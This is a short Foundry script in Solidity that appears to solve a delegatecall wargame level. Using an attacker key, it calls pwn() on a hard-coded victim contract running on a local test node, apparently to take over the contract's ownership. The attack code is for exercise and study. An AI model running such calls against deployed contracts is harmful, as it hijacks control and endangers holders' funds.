// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract DelegateAttacker is Script, HelperConfigLib {
    function run() external {
        address victim = 0x3Ca8f9C04c7e3E1624Ac2008F92f6F366A869444;
        vm.startBroadcast(ATTACKER_KEY);
        (bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
        require(success);
    }
}

// forge script ./script/DelegateAttacker.s.sol:DelegateAttacker --rpc-url http://127.0.0.1:8545 --broadcast -vvv
